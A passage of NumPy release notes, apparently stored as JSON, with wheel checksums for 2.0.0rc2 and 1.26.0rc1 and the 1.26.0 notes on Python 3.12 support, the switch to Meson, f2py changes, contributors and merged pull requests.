numpy-2.0.0rc2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    69c0e5b2a6054cee4cef3cfadf5bfc68  numpy-2.0.0rc2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    8b6547f02d1fb76a3436900146509476  numpy-2.0.0rc2-cp310-cp310-musllinux_1_1_aarch64.whl\n    85008275bc2ebb5d540ec89d20f95d72  numpy-2.0.0rc2-cp310-cp310-musllinux_1_1_x86_64.whl\n    46d1b93d2f2a6985d6440e010fe231a6  numpy-2.0.0rc2-cp310-cp310-win32.whl\n    df23c9ab080e695009e6c9dfc5c9dfee  numpy-2.0.0rc2-cp310-cp310-win_amd64.whl\n    4f4ac0bbff2152b95851f720be6e04ff  numpy-2.0.0rc2-cp311-cp311-macosx_10_9_x86_64.whl\n    df05a737d40018381c465e083fda65ba  numpy-2.0.0rc2-cp311-cp311-macosx_11_0_arm64.whl\n    9f3bbbce699559418b713f24bac5fd12  numpy-2.0.0rc2-cp311-cp311-macosx_14_0_arm64.whl\n    ced25c7ad09b414f941584582c52ce54  numpy-2.0.0rc2-cp311-cp311-macosx_14_0_x86_64.whl\n    b3af5409624e6aafb31107bd52bb8448  numpy-2.0.0rc2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2859530bd0234983dadaa51b44a09daf  numpy-2.0.0rc2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    de6b8fe89c20bd85652679bb4a4671ef  numpy-2.0.0rc2-cp311-cp311-musllinux_1_1_aarch64.whl\n    2f0f3fed01479ee14a05aa1fc960d33a  numpy-2.0.0rc2-cp311-cp311-musllinux_1_1_x86_64.whl\n    0542e8d87c48155e1c8534e2a39f5e7a  numpy-2.0.0rc2-cp311-cp311-win32.whl\n    b7f451c340e92eb3d8b31ea5390f7340  numpy-2.0.0rc2-cp311-cp311-win_amd64.whl\n    f41d4e26c72340801d6f2bb609edba46  numpy-2.0.0rc2-cp312-cp312-macosx_10_9_x86_64.whl\n    1f8b24cc5b3006d778651e9ca9f7ed8c  numpy-2.0.0rc2-cp312-cp312-macosx_11_0_arm64.whl\n    5fd09e2e0fcb38fddac7b3ef1807ed82  numpy-2.0.0rc2-cp312-cp312-macosx_14_0_arm64.whl\n    f6eca0f2a9c770f6c6a4ba551ad7e237  numpy-2.0.0rc2-cp312-cp312-macosx_14_0_x86_64.whl\n    21b03eca64e88b952d843a70185e4144  numpy-2.0.0rc2-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f7631a072b83fc080662c3f435ba6fd4  numpy-2.0.0rc2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    2a62e6cffd78fd3d35c9142d4c214c00  numpy-2.0.0rc2-cp312-cp312-musllinux_1_1_aarch64.whl\n    25467c8e576bbc140bafe38f3b1fdd60  numpy-2.0.0rc2-cp312-cp312-musllinux_1_1_x86_64.whl\n    b7d74f54199d7fa355ec4abc3f2cafff  numpy-2.0.0rc2-cp312-cp312-win32.whl\n    351eb69f9e0e69b06d13a8c03733e5e6  numpy-2.0.0rc2-cp312-cp312-win_amd64.whl\n    c774b6e40b62f0503788cd7042bf85a1  numpy-2.0.0rc2-cp39-cp39-macosx_10_9_x86_64.whl\n    ef664eaadd0796fbc37fc3cc0c498c2e  numpy-2.0.0rc2-cp39-cp39-macosx_11_0_arm64.whl\n    f9a1d24dbeaa6433b827d82b9622b04b  numpy-2.0.0rc2-cp39-cp39-macosx_14_0_arm64.whl\n    8ea2a873c471a5180d8a316c14abb09f  numpy-2.0.0rc2-cp39-cp39-macosx_14_0_x86_64.whl\n    dce70c212e9c321ca189867f7ebc8e03  numpy-2.0.0rc2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    feacd9a21c6de648e8117bc1cc36fcc5  numpy-2.0.0rc2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cd34c2b0f9e25d80d2c4bd70717d565b  numpy-2.0.0rc2-cp39-cp39-musllinux_1_1_aarch64.whl\n    c1efda069b8c8826a6ba6d7a49ada148  numpy-2.0.0rc2-cp39-cp39-musllinux_1_1_x86_64.whl\n    4ef25fd7e575fa64d4c4e9dfdc1c9174  numpy-2.0.0rc2-cp39-cp39-win32.whl\n    d35cd476de68374a10d56737a882e735  numpy-2.0.0rc2-cp39-cp39-win_amd64.whl\n    b83c7ccda03ec1a1fec900c149bdc90d  numpy-2.0.0rc2-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    0aff6e5f70e2d9fa299e3895294bd7a8  numpy-2.0.0rc2-pp39-pypy39_pp73-macosx_14_0_x86_64.whl\n    dd1c5bf6559fe41b21c81097e97232c3  numpy-2.0.0rc2-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ecab2eae88f6ba9421787655909045b7  numpy-2.0.0rc2-pp39-pypy39_pp73-win_amd64.whl\n    884d0fe28f77f07a3d51ba905ffdf0d3  numpy-2.0.0rc2.tar.gz\n\nSHA256\n------\n::\n\n    53286933bf3be7a13459c7a7885ce0935aff56fe0baf280f0e6d80e75cc3ee3c  numpy-2.0.0rc2-cp310-cp310-macosx_10_9_x86_64.whl\n    2bc615498fce8e15b99c1b4d7e018ffebf7bd1a288665b3b916357bdf6725d6a  numpy-2.0.0rc2-cp310-cp310-macosx_11_0_arm64.whl\n    159d9c21a2989afdfebb638f60268becbc3da07eb224d9221a7c37255216feb6  numpy-2.0.0rc2-cp310-cp310-macosx_14_0_arm64.whl\n    c58bc6aac83175dcfa02a0ef92b7a7fff5a0420014202f052a9af6214684e6ac  numpy-2.0.0rc2-cp310-cp310-macosx_14_0_x86_64.whl\n    9b07a5c460941ae5ef8cde51c04b635af58abbbd55387ad6257dbdfda043290a  numpy-2.0.0rc2-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0a49e876be11b4409eb3120841c7d2dba1f63549224f85fa4ab7ee83288c3b41  numpy-2.0.0rc2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    951164e9919664a3e5e605715809173b47f14329b586e24ec05e66ae516ce11b  numpy-2.0.0rc2-cp310-cp310-musllinux_1_1_aarch64.whl\n    201c0e05854d25f16b15851380c07d61aab34eef76a2acf1c3fcc4bda0879b0b  numpy-2.0.0rc2-cp310-cp310-musllinux_1_1_x86_64.whl\n    800ff28d0da25fca3f843c19035005b73c76350be7c6fa6061c8fcdd248aced9  numpy-2.0.0rc2-cp310-cp310-win32.whl\n    2a9a5ee4b090af548a1019bb76b53b02cb37f09dc002386349ee5e79ff54c40e  numpy-2.0.0rc2-cp310-cp310-win_amd64.whl\n    6d23b0db1fd4ad8225fd32f39036b07a5052398929a5af5291379bceac49d95a  numpy-2.0.0rc2-cp311-cp311-macosx_10_9_x86_64.whl\n    a99ac361ddb0ef14894c3e7405aa98ffdfe6d0101b9f4a2e931f3912f3b43085  numpy-2.0.0rc2-cp311-cp311-macosx_11_0_arm64.whl\n    6aba1c147f69ee1fb8afb44e93178e92d2aa9a3bf5374b6f1cb53ee1cae1376d  numpy-2.0.0rc2-cp311-cp311-macosx_14_0_arm64.whl\n    4f3a4c676ab4ce211e5886cb16cc282e9e18b352b2b1427bbb4c104f9d80f12a  numpy-2.0.0rc2-cp311-cp311-macosx_14_0_x86_64.whl\n    12d3bf0cac2aec23e10b6927ee063aa6cf7ca8deba1d3c5702faa0ea5cfb8049  numpy-2.0.0rc2-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a44b0ebf7ef61c289a33c76247874177c446083c5236c7e7e0595350883e0424  numpy-2.0.0rc2-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0e146557fdede5a7434a788648e62a9e87db8c6e05136a92483e2c2180ad4bab  numpy-2.0.0rc2-cp311-cp311-musllinux_1_1_aarch64.whl\n    01ac116e2f053f283ac5292fcd146f8f223d4b6cd343beab341748818692a2de  numpy-2.0.0rc2-cp311-cp311-musllinux_1_1_x86_64.whl\n    74dcc392725837896532ec7d65506cbeaecee237871b36ae813521bc3e2c40ed  numpy-2.0.0rc2-cp311-cp311-win32.whl\n    225c2b3303eb2ebf745ab954ef8723cd60f64d926edd73dc963141538ddc48ed  numpy-2.0.0rc2-cp311-cp311-win_amd64.whl\n    32207294f21331ae0d7fd33dc9324447a8117d5af15a0895f39af3441d4af70e  numpy-2.0.0rc2-cp312-cp312-macosx_10_9_x86_64.whl\n    a666cc3d55f301b86edc7f1eaef10ffa1f79206c4b196a1f2649f91c8a1b49b6  numpy-2.0.0rc2-cp312-cp312-macosx_11_0_arm64.whl\n    fa5485c565ca222ba69c5fe04ebd8a89f884615466d74e0856e03fff873bcc43  numpy-2.0.0rc2-cp312-cp312-macosx_14_0_arm64.whl\n    2202abe3e8afb2b88102a75f1beb888f380c09d40898db0f1df5d847623701d5  numpy-2.0.0rc2-cp312-cp312-macosx_14_0_x86_64.whl\n    6b93d6b401db67948a4997e2c45e958df65b98b1a9183e96e96e491f9fb3c2fe  numpy-2.0.0rc2-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1691e64c838d33fdba59ac7043144194f8f847b5fec6f47ecd9e117418cc9bdc  numpy-2.0.0rc2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    7288d8ac70be23ff29df8da51840aad8f7acd9120d27cd7a61488b96bc5ad68b  numpy-2.0.0rc2-cp312-cp312-musllinux_1_1_aarch64.whl\n    9dd61b79856aed44f818fffe1555fa7ef8f6ffa5b5211cde473e2e33f7a5bd92  numpy-2.0.0rc2-cp312-cp312-musllinux_1_1_x86_64.whl\n    83c76a11c5e5a343fb1cb87afec147d6bebac91758c9c9f01d2c692ae4750e27  numpy-2.0.0rc2-cp312-cp312-win32.whl\n    24bcf0cdd31debdcb80e1f3bb7dba224c9a93a66f48ff1b1df2cb9a53eede944  numpy-2.0.0rc2-cp312-cp312-win_amd64.whl\n    87172a69d7eafb00ea1b734dba9ffebb474505082078ec2d95b99918f14a0a0e  numpy-2.0.0rc2-cp39-cp39-macosx_10_9_x86_64.whl\n    e13a1fa60a471b79a53de8abb87e1e0ad53e6899edee8a29b4db3edccee53d65  numpy-2.0.0rc2-cp39-cp39-macosx_11_0_arm64.whl\n    32725b717f902e7243d270e50ff9487a499820233b57c3e71b33f65a84707e38  numpy-2.0.0rc2-cp39-cp39-macosx_14_0_arm64.whl\n    f8c7012dd6779f078e3f42e19a2204275abe4d68a80dc807a97caf42e825d9c3  numpy-2.0.0rc2-cp39-cp39-macosx_14_0_x86_64.whl\n    a0202e282ec9d45fc6ddb85777fddeea1107fe4555be50dd22d044e7fe01860c  numpy-2.0.0rc2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5262d69981502ded9b397c3fd5a20a1f2c91a66b21325ddff5e6d88486eee6fa  numpy-2.0.0rc2-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6fe254c271f8ce4c2e60250f8ee80684abd2be748af84312a05b7614c3ae3b8d  numpy-2.0.0rc2-cp39-cp39-musllinux_1_1_aarch64.whl\n    0a2cf839a7d6cc0b854ba81cdfee96aad2c7e4d558c7e23ca82d08e4f7d7daa7  numpy-2.0.0rc2-cp39-cp39-musllinux_1_1_x86_64.whl\n    9ea90fb601d5ac32ff7f9f0a3bf7ccab5971a0196364b9429734bd270cd2fa67  numpy-2.0.0rc2-cp39-cp39-win32.whl\n    9e00367261ee0347208a8bcc355b6470b084cb777c45141e098328b67b02c98b  numpy-2.0.0rc2-cp39-cp39-win_amd64.whl\n    da6ab9dab471668155e0b208ab710417a7407397794a88b3ccbece5bcf10091d  numpy-2.0.0rc2-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    b3ba5f436c6de9b8829f231e9eb9e394aa819efce9eab697cd4e558b0b8c6cc8  numpy-2.0.0rc2-pp39-pypy39_pp73-macosx_14_0_x86_64.whl\n    d5211fd4e126699b16b8573eef007f25afb9459d966b35430908798b24298e3b  numpy-2.0.0rc2-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0d5cfbf693408cf1ee72d79d36d51f7b63f5e46a5e9cf12f63d4ed07c0f876e0  numpy-2.0.0rc2-pp39-pypy39_pp73-win_amd64.whl\n    868e9edbee689d6fdb7957c0b790de2b2123e6feff5d66045d10760c521f2c00  numpy-2.0.0rc2.tar.gz\n\n\n==========================\n", "1.26.0": "==========================\n\nThe NumPy 1.26.0 release is a continuation of the 1.25.x release cycle with the\naddition of Python 3.12.0 support. Python 3.12 dropped distutils, consequently\nsupporting it required finding a replacement for the setup.py/distutils based\nbuild system NumPy was using. We have chosen to use the Meson build system\ninstead, and this is the first NumPy release supporting it. This is also the\nfirst release that supports Cython 3.0 in addition to retaining 0.29.X\ncompatibility. Supporting those two upgrades was a large project, over 100\nfiles have been touched in this release. The changelog doesn't capture the full\nextent of the work, special thanks to Ralf Gommers, Sayed Adel, St\u00e9fan van der\nWalt, and Matti Picus who did much of the work in the main development branch.\n\nThe highlights of this release are:\n\n- Python 3.12.0 support.\n- Cython 3.0.0 compatibility.\n- Use of the Meson build system\n- Updated SIMD support\n- f2py fixes, meson and bind(x) support\n\nThe Python versions supported in this release are 3.9-3.12.\n\n\nNew Features\n============\n\nArray API v2022.12 support in ``numpy.array_api``\n-------------------------------------------------\n\n- ``numpy.array_api`` now full supports the `v2022.12 version\n  <https://data-apis.org/array-api/2022.12>`__ of the array API standard. Note\n  that this does not yet include the optional ``fft`` extension in the\n  standard.\n\n(`gh-23789 <https://github.com/numpy/numpy/pull/23789>`__)\n\nSupport for the updated Accelerate BLAS/LAPACK library\n------------------------------------------------------\nSupport for the updated Accelerate BLAS/LAPACK library, including ILP64 (64-bit\ninteger) support, in macOS 13.3 has been added. This brings arm64 support, and\nsignificant performance improvements of up to 10x for commonly used linear\nalgebra operations. When Accelerate is selected at build time, the 13.3+\nversion will automatically be used if available.\n\n(`gh-24053 <https://github.com/numpy/numpy/pull/24053>`__)\n\n``meson`` backend for ``f2py``\n------------------------------\n``f2py`` in compile mode (i.e. ``f2py -c``) now accepts the ``--backend meson``\noption. This is the default option for Python ``3.12`` on-wards. Older versions\nwill still default to ``--backend distutils``.\n\nTo support this in realistic use-cases, in compile mode ``f2py`` takes a\n``--dep`` flag one or many times which maps to ``dependency()`` calls in the\n``meson`` backend, and does nothing in the ``distutils`` backend.\n\nThere are no changes for users of ``f2py`` only as a code generator, i.e.\nwithout ``-c``.\n\n(`gh-24532 <https://github.com/numpy/numpy/pull/24532>`__)\n\n``bind(c)`` support for ``f2py``\n--------------------------------\nBoth functions and subroutines can be annotated with ``bind(c)``. ``f2py`` will\nhandle both the correct type mapping, and preserve the unique label for other\n``C`` interfaces.\n\n**Note:** ``bind(c, name = 'routine_name_other_than_fortran_routine')`` is not\nhonored by the ``f2py`` bindings by design, since ``bind(c)`` with the ``name``\nis meant to guarantee only the same name in ``C`` and ``Fortran``, not in\n``Python`` and ``Fortran``.\n\n(`gh-24555 <https://github.com/numpy/numpy/pull/24555>`__)\n\n\nImprovements\n============\n\n``iso_c_binding`` support for ``f2py``\n--------------------------------------\nPreviously, users would have to define their own custom ``f2cmap`` file to use\ntype mappings defined by the Fortran2003 ``iso_c_binding`` intrinsic module.\nThese type maps are now natively supported by ``f2py``\n\n(`gh-24555 <https://github.com/numpy/numpy/pull/24555>`__)\n\n\nBuild system changes\n====================\n\nIn this release, NumPy has switched to Meson as the build system and\nmeson-python as the build backend. Installing NumPy or building a wheel can be\ndone with standard tools like ``pip`` and ``pypa/build``. The following are\nsupported:\n\n- Regular installs: ``pip install numpy`` or (in a cloned repo)\n  ``pip install .``\n- Building a wheel: ``python -m build`` (preferred), or ``pip wheel .``\n- Editable installs: ``pip install -e . --no-build-isolation``\n- Development builds through the custom CLI implemented with\n  `spin <https://github.com/scientific-python/spin>`__: ``spin build``.\n\nAll the regular ``pip`` and ``pypa/build`` flags (e.g.,\n``--no-build-isolation``) should work as expected.\n\nNumPy-specific build customization\n----------------------------------\n\nMany of the NumPy-specific ways of customizing builds have changed.\nThe ``NPY_*`` environment variables which control BLAS/LAPACK, SIMD, threading,\nand other such options are no longer supported, nor is a ``site.cfg`` file to\nselect BLAS and LAPACK. Instead, there are command-line flags that can be\npassed to the build via ``pip``/``build``'s config-settings interface. These\nflags are all listed in the ``meson_options.txt`` file in the root of the repo.\nDetailed documented will be available before the final 1.26.0 release; for now\nplease see `the SciPy \"building from source\" docs\n<http://scipy.github.io/devdocs/building/index.html>`__ since most build\ncustomization works in an almost identical way in SciPy as it does in NumPy.\n\nBuild dependencies\n------------------\n\nWhile the runtime dependencies of NumPy have not changed, the build\ndependencies have. Because we temporarily vendor Meson and meson-python,\nthere are several new dependencies - please see the ``[build-system]`` section\nof ``pyproject.toml`` for details.\n\nTroubleshooting\n---------------\n\nThis build system change is quite large. In case of unexpected issues, it is\nstill possible to use a ``setup.py``-based build as a temporary workaround (on\nPython 3.9-3.11, not 3.12), by copying ``pyproject.toml.setuppy`` to\n``pyproject.toml``. However, please open an issue with details on the NumPy\nissue tracker. We aim to phase out ``setup.py`` builds as soon as possible, and\ntherefore would like to see all potential blockers surfaced early on in the\n1.26.0 release cycle.\n\n\nContributors\n============\n\nA total of 18 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* DWesl\n* Albert Steppi +\n* Bas van Beek\n* Charles Harris\n* Developer-Ecosystem-Engineering\n* Jake Vanderplas\n* Marten van Kerkwijk\n* Matti Picus\n* Melissa Weber Mendon\u00e7a\n* Namami Shanker\n* Nathan Goldbaum\n* Ralf Gommers\n* Rohit Goswami\n* Sayed Adel\n* Sebastian Berg\n* Stefan van der Walt\n* Tyler Reddy\n* Warren Weckesser\n\n\nPull requests merged\n====================\n\nA total of 51 pull requests were merged for this release.\n\n* `24305 <https://github.com/numpy/numpy/pull/24305>`__: MAINT: Prepare 1.26.x branch for development\n* `24308 <https://github.com/numpy/numpy/pull/24308>`__: MAINT: Massive update of files from main for numpy 1.26\n* `24322 <https://github.com/numpy/numpy/pull/24322>`__: CI: fix wheel builds on the 1.26.x branch\n* `24326 <https://github.com/numpy/numpy/pull/24326>`__: BLD: update openblas to newer version\n* `24327 <https://github.com/numpy/numpy/pull/24327>`__: TYP: Trim down the ``_NestedSequence.__getitem__`` signature\n* `24328 <https://github.com/numpy/numpy/pull/24328>`__: BUG: fix choose refcount leak\n* `24337 <https://github.com/numpy/numpy/pull/24337>`__: TST: fix running the test suite in builds without BLAS/LAPACK\n* `24338 <https://github.com/numpy/numpy/pull/24338>`__: BUG: random: Fix generation of nan by dirichlet.\n* `24340 <https://github.com/numpy/numpy/pull/24340>`__: MAINT: Dependabot updates from main\n* `24342 <https://github.com/numpy/numpy/pull/24342>`__: MAINT: Add back NPY_RUN_MYPY_IN_TESTSUITE=1\n* `24353 <https://github.com/numpy/numpy/pull/24353>`__: MAINT: Update ``extbuild.py`` from main.\n* `24356 <https://github.com/numpy/numpy/pull/24356>`__: TST: fix distutils tests for deprecations in recent setuptools...\n* `24375 <https://github.com/numpy/numpy/pull/24375>`__: MAINT: Update cibuildwheel to version 2.15.0\n* `24381 <https://github.com/numpy/numpy/pull/24381>`__: MAINT: Fix codespaces setup.sh script\n* `24403 <https://github.com/numpy/numpy/pull/24403>`__: ENH: Vendor meson for multi-target build support\n* `24404 <https://github.com/numpy/numpy/pull/24404>`__: BLD: vendor meson-python to make the Windows builds with SIMD...\n* `24405 <https://github.com/numpy/numpy/pull/24405>`__: BLD, SIMD: The meson CPU dispatcher implementation\n* `24406 <https://github.com/numpy/numpy/pull/24406>`__: MAINT: Remove versioneer\n* `24409 <https://github.com/numpy/numpy/pull/24409>`__: REL: Prepare for the NumPy 1.26.0b1 release.\n* `24453 <https://github.com/numpy/numpy/pull/24453>`__: MAINT: Pin upper version of sphinx.\n* `24455 <https://github.com/numpy/numpy/pull/24455>`__: ENH: Add prefix to _ALIGN Macro\n* `24456 <https://github.com/numpy/numpy/pull/24456>`__: BUG: cleanup warnings [skip azp][skip circle][skip travis][skip...\n* `24460 <https://github.com/numpy/numpy/pull/24460>`__: MAINT: Upgrade to spin 0.5\n* `24495 <https://github.com/numpy/numpy/pull/24495>`__: BUG: ``asv dev`` has been removed, use ``asv run``.\n* `24496 <https://github.com/numpy/numpy/pull/24496>`__: BUG: Fix meson build failure due to unchanged inplace auto-generated...\n* `24521 <https://github.com/numpy/numpy/pull/24521>`__: BUG: fix issue with git-version script, needs a shebang to run\n* `24522 <https://github.com/numpy/numpy/pull/24522>`__: BUG: Use a default assignment for git_hash [skip ci]\n* `24524 <https://github.com/numpy/numpy/pull/24524>`__: BUG: fix NPY_cast_info error handling in choose\n* `24526 <https://github.com/numpy/numpy/pull/24526>`__: BUG: Fix common block handling in f2py\n* `24541 <https://github.com/numpy/numpy/pull/24541>`__: CI,TYP: Bump mypy to 1.4.1\n* `24542 <https://github.com/numpy/numpy/pull/24542>`__: BUG: Fix assumed length f2py regression\n* `24544 <https://github.com/numpy/numpy/pull/24544>`__: MAINT: Harmonize fortranobject\n* `24545 <https://github.com/numpy/numpy/pull/24545>`__: TYP: add kind argument to numpy.isin type specification\n* `24561 <https://github.com/numpy/numpy/pull/24561>`__: BUG: fix comparisons between masked and unmasked structured arrays\n* `24590 <https://github.com/numpy/numpy/pull/24590>`__: CI: Exclude import libraries from list of DLLs on Cygwin.\n* `24591 <https://github.com/numpy/numpy/pull/24591>`__: BLD: fix ``_umath_linalg`` dependencies\n* `24594 <https://github.com/numpy/numpy/pull/24594>`__: MAINT: Stop testing on ppc64le.\n* `24602 <https://github.com/numpy/numpy/pull/24602>`__: BLD: meson-cpu: fix SIMD support on platforms with no features\n* `24606 <https://github.com/numpy/numpy/pull/24606>`__: BUG: Change Cython ``binding`` directive to \"False\".\n* `24613 <https://github.com/numpy/numpy/pull/24613>`__: ENH: Adopt new macOS Accelerate BLAS/LAPACK Interfaces, including...\n* `24614 <https://github.com/numpy/numpy/pull/24614>`__: DOC: Update building docs to use Meson\n* `24615 <https://github.com/numpy/numpy/pull/24615>`__: TYP: Add the missing ``casting`` keyword to ``np.clip``\n* `24616 <https://github.com/numpy/numpy/pull/24616>`__: TST: convert cython test from setup.py to meson\n* `24617 <https://github.com/numpy/numpy/pull/24617>`__: MAINT: Fixup ``fromnumeric.pyi``\n* `24622 <https://github.com/numpy/numpy/pull/24622>`__: BUG, ENH: Fix ``iso_c_binding`` type maps and fix ``bind(c)``...\n* `24629 <https://github.com/numpy/numpy/pull/24629>`__: TYP: Allow ``binary_repr`` to accept any object implementing...\n* `24630 <https://github.com/numpy/numpy/pull/24630>`__: TYP: Explicitly declare ``dtype`` and ``generic`` hashable\n* `24637 <https://github.com/numpy/numpy/pull/24637>`__: ENH: Refactor the typing \"reveal\" tests using `typing.assert_type`\n* `24638 <https://github.com/numpy/numpy/pull/24638>`__: MAINT: Bump actions/checkout from 3.6.0 to 4.0.0\n* `24647 <https://github.com/numpy/numpy/pull/24647>`__: ENH: ``meson`` backend for ``f2py``\n* `24648 <https://github.com/numpy/numpy/pull/24648>`__: MAINT: Refactor partial load Workaround for Clang\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    9bcab451e9d0eadcc00ca8ce2f5938e7  numpy-1.26.0rc1-cp310-cp310-macosx_10_9_x86_64.whl\n    4b1c33742eaba91fb2a3fdf531c086f8  numpy-1.26.0rc1-cp310-cp310-macosx_11_0_arm64.whl\n    6adb6b6a762f256f5ca6c82b6a302912  numpy-1.26.0rc1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c4dbed88820255134bcae15d02c658ed  numpy-1.26.0rc1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    72dbf4449513dc1ef51b59266199cf37  numpy-1.26.0rc1-cp310-cp310-musllinux_1_1_x86_64.whl\n    c25812360af41a904324503d7ca02cce  numpy-1.26.0rc1-cp310-cp310-win_amd64.whl\n    6bbaeaa8c54a084c749ad4ede57bbeb6  numpy-1.26.0rc1-cp311-cp311-macosx_10_9_x86_64.whl\n    f0585ce50c22914e0f039fd817a847c4  numpy-1.26.0rc1-cp311-cp311-macosx_11_0_arm64.whl\n    79e7deab2a43552aa4f4097183e6287d  numpy-1.26.0rc1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1f94542339a4e6327914398b7785876b  numpy-1.26.0rc1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3c3c3ea226bcf0e92796da621c0ac7fe  numpy-1.26.0rc1-cp311-cp311-musllinux_1_1_x86_64.whl\n    5d6bca28d5c43fc839e4d8eff3b3a35c  numpy-1.26.0rc1-cp311-cp311-win_amd64.whl\n    94df9fa058c650073de474555cc6f0dc  numpy-1.26.0rc1-cp312-cp312-macosx_10_9_x86_64.whl\n    2ef744a42b9db31f7ce4a0c7cb8b546d  numpy-1.26.0rc1-cp312-cp312-macosx_11_0_arm64.whl\n    cf2b61c8480245995348fc2ddc4f556f  numpy-1.26.0rc1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    18cea65bce62f924c34d3b0148db4669  numpy-1.26.0rc1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5aede55c449bdc62e59230f786faa400  numpy-1.26.0rc1-cp312-cp312-musllinux_1_1_x86_64.whl\n    15c8199396b8adcfc9a6e4fb730d6faf  numpy-1.26.0rc1-cp312-cp312-win_amd64.whl\n    c9d97598b2bcaac53dc082106d0bc926  numpy-1.26.0rc1-cp39-cp39-macosx_10_9_x86_64.whl\n    8359d919806089cf48086c923e1b2e81  numpy-1.26.0rc1-cp39-cp39-macosx_11_0_arm64.whl\n    4322ecb6dd6db9dc704f54603622da72  numpy-1.26.0rc1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a275abd27929fa7428c94b6c493798d7  numpy-1.26.0rc1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a374c440c6233a78b0bb1bf11776e48f  numpy-1.26.0rc1-cp39-cp39-musllinux_1_1_x86_64.whl\n    3e540eca6628510c604099a6c0a79fb5  numpy-1.26.0rc1-cp39-cp39-win_amd64.whl\n    a7b15d45d9b18bd2f065be1eafa3cfea  numpy-1.26.0rc1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    b7e926a0415c30df7010400936922cd7  numpy-1.26.0rc1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    8430d4acc483c66d76b8263ac90195e6  numpy-1.26.0rc1-pp39-pypy39_pp73-win_amd64.whl\n    23bf7c39807a9cce5c8ea0ba293b7dd9  numpy-1.26.0rc1.tar.gz\n\nSHA256\n------\n::\n\n    abe4b4414edd3dc61a2f6df6f0aa7711c654fc59f41a0eeae4c34b9bfc18aa22  numpy-1.26.0rc1-cp310-cp310-macosx_10_9_x86_64.whl\n    0e294b045e6fa8f071e4c88836b0df2167fc74ff8561138aa5cd69d1ee98b15e  numpy-1.26.0rc1-cp310-cp310-macosx_11_0_arm64.whl\n    38324eb42bcd45db0b509d02325cb0e3058b6cf05beaf5bd02c221a3133cc9ff  numpy-1.26.0rc1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    302003be9baeb79f07153426544f87f534eb9fe3b8399ac8ee8420f5cfd7ed5c  numpy-1.26.0rc1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f8a9eb3d3f74978cb155a12a77046dae5b8d76bfcf56f76cc92f0d5976857ef9  numpy-1.26.0rc1-cp310-cp310-musllinux_1_1_x86_64.whl\n    a9b4723216f7970f571d0d71935b32ffe0eacd011befbaa977f34e928ece8c71  numpy-1.26.0rc1-cp310-cp310-win_amd64.whl\n    5db29b5d2c73a05ef7ed2a37a1ca8f9391579c402a57f6e0944daf755cf7d437  numpy-1.26.0rc1-cp311-cp311-macosx_10_9_x86_64.whl\n    180ef984616afd4d746961ac8c874ddd5d547ba8f7dd8a58c30bde398c95d15c  numpy-1.26.0rc1-cp311-cp311-macosx_11_0_arm64.whl\n    0e3c8d925204ba0aa887244adec030e71003b828d24731f9feb01526aed76458  numpy-1.26.0rc1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    01851e82e3256a6c0088e43e69279a0c96214bafa1be326c7a87390d91eb7d44  numpy-1.26.0rc1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    26571d9f63f49e7612fcfc4375ad23d6882e951bca335115ce440add1a565556  numpy-1.26.0rc1-cp311-cp311-musllinux_1_1_x86_64.whl\n    f10ef55f19e6634c10b87c5a7c3687461fe950680ebe16e85c03905bcbf6b205  numpy-1.26.0rc1-cp311-cp311-win_amd64.whl\n    b28cc269bbdd2b6e005241100a97460fdd574ce495fa0eeda3d290d8fd0c66fa  numpy-1.26.0rc1-cp312-cp312-macosx_10_9_x86_64.whl\n    965fedf11de8b621a20fe7182b95ef9ee76764bc1fc288e5b2cb6e8440372560  numpy-1.26.0rc1-cp312-cp312-macosx_11_0_arm64.whl\n    2ff5f4f14a772e0f86a250d6db86c4121bc1ce7d788f64053e82638e735bb61b  numpy-1.26.0rc1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    290c9be374026e63c6e5f5099a06c2cdfea33ff2935e7f46fcd9a1b38728c80c  numpy-1.26.0rc1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    